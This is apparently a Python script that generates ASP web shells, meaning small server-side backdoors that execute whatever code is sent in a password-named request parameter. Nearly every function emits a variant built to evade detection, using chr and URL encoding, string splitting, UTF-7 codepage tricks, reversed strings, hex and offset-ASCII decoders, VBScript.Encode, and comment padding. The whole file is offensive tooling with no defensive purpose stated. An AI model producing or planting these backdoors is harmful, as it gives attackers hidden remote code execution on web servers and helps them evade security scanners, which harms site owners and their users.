def asp_base(pwd):
    '''基本马'''
    a1='<%eval request("'+pwd+'")%>'
    a2='<%execute request("'+pwd+'")%>'
    a3='<%execute(request("'+pwd+'"))%>'
    a4='<%ExecuteGlobal request("'+pwd+'")%>'
    return a1+'\n'+a2+'\n'+a3+'\n'+a4

def asp_pwdchr(pwd):
    '''转换密码,密码长度只能是1'''
    return '<%Eval(Request(chr('+str(ord(pwd[0]))+')))%>'

def asp_confusion1(pwd):
    '''多个<%%>简单混淆'''
    return '<%dy=request("'+pwd+'")%><%Eval(dy)%>'


def asp_confusion2(pwd):
    '''session混淆'''
    return '<%if request ("'+pwd+'")<>""then session("'+pwd+'")=request("'+pwd+'"):end if:if session("'+pwd+'")<>"" then execute session("'+pwd+'")%>'

def asp_confusion3(pwd):
    '''if then 简单混淆'''
    return '<% if Request("'+pwd+'")<>"" then ExecuteGlobal request("'+pwd+'") end if %>'

def asp_loop1(pwd):
    '''带loop的'''
    return '<%execute request("'+pwd+'")%><%<%loop<%:%>'+'\n'+'<%execute request("'+pwd+'")<%loop<%:%>'

def asp_loop2(pwd):
    '''带loop的'''
    return '<%<%loop<%:%><%execute request("'+pwd+'")%>'


def asp_vbsbase(pwd):
    '''script language=vbs的'''
    return '<script language=vbs runat=server>eval(request("'+pwd+'"))</script>'+'\n'+'<script language=VBScript runat=server>execute request("'+pwd+'")</script>'

def asp_chr(pwd):
    '''chr混淆'''
    return '<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("'+pwd+'"))%>'


def asp_and(pwd):
    '''&混淆,密码是数字(-18,9)'''
    pwd=int(pwd)
    if pwd<-18 or pwd>9:return 'pwd超范围'
    import random
    while 1:
        a=random.randint(0,9)
        b=random.randint(0,9)
        c=a-b
        d=pwd-c
        if d>0:
            continue
        else:
            r=str(a)+'"&"-"&"'+str(b)+'"&"-"&"'+str(-d)
            break

    return '<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"'+r+'"&")"&")")%>'


def asp_urlen(pwd):
    '''url编码'''
    return '<%execute(unescape("eval%20request%28%22'+pwd+'%22%29"))%>'

def asp_encodeutf7():
    '''utf7编码,密码#'''
    return '<%@ codepage=65000%><% response.Charset=”936″%><%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%>'

def asp_encodeutf7_2():
    '''utf7编码'''
    return '<%@ LANGUAGE = VBScript.Encode %>\n<%#@~^PgAAAA==r6P. ;!+/D`14Dv&X#*@!@*ErPPD4+ P2Xn^ED+VVG4Cs,Dn;!n/D`^4M`&Xb*oBMAAA==^#~@%>'

def asp_encodeutf7_3():
    '''utf7编码,密码#'''

    return '''<%@codepage=65000%>
<%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t("#")%>'''

def asp_reverse(pwd):
    '''关键字符串反向,密码长度只能是1'''
    return '''<%
Function MorfiCoder(Code)
MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\\*\\",vbCrlf)
End Function
Execute MorfiCoder(")/*/'''+pwd[0]+'''/*/(tseuqer lave")
%>'''

def asp_CreateObject(pwd):
    '''使用server.CreateObject,密码长度只能是1'''

    return '''<%set ms = server.CreateObject("MSScriptControl.ScriptControl.1")
ms.Language="VBScript"
ms.AddObject "Response", Response
ms.AddObject "request", request
ms.AddObject "session", session
ms.AddObject "server", server
ms.AddObject "application", application
ms.ExecuteStatement ("ex"&"e"&"cute(request(chr('''+str(ord(pwd[0]))+''')))")%>'''

def asp_aacode():
    '''aacode编码,密码c'''

    return '''<%
password=Request("c")
Execute(AACode("457865637574652870617373776F726429")):Function AACode(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute("AACode=AACode&chr(&H"&c&")"):Else:Execute("AACode=AACode&chr(&H"&c&Mid(s,i+2,2)&")"):i=i+2:End If:Next:End Function
%>'''

def asp_DeAsc(pwd):
    '''DeAsc编码'''
    vname=input('编码前字符串内的变量名(?=Request):')
    dvalue=input('编码差值(默认18):')
    spl=input('分隔符,长度1,不能是数字(默认%):')
    
    if dvalue=='':dvalue=18
    else:dvalue=abs(int(dvalue))
    if spl=='':spl='%'
    else:
        spl=spl[0]
        if spl.isdigit():
            return '[!]分隔符不能是数字'

    sen='Execute('+vname+')'
    sen=spl+spl.join([str(ord(i)+dvalue) for i in sen])


    return '''<%
'''+vname+'''=Request("'''+pwd+'''")
Execute(DeAsc("'''+sen+'''")):Function DeAsc(Str):Str=Split(Str,"'''+spl+'''"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-'''+str(dvalue)+'''):Next:End Function
%>'''


def asp_jscript(pwd):
    '''使用Jscript'''

    return '''<%@ Page Language="Jscript"%>
<%
var a = Request.Item["'''+pwd+'''"];
var b = "un" + Char ( 115 ) + Char ( 97 ) + "fe";
eval(a,b);
%>'''


def asp_dim(pwd):
    '''使用dim play'''

    return """<%
dim play
'
'
''''''''''''''''''
'''''''''"""+'''
play = request("'''+pwd+'''")
%>
Error
<%
execute(play)
%>'''


def asp_rem(pwd):
    '''使用rem'''

    return '''<%
    a = request("'''+pwd+'''")
    b = a REM a
    execute(b)
%>'''


if __name__ == "__main__":
    asp_and(-7)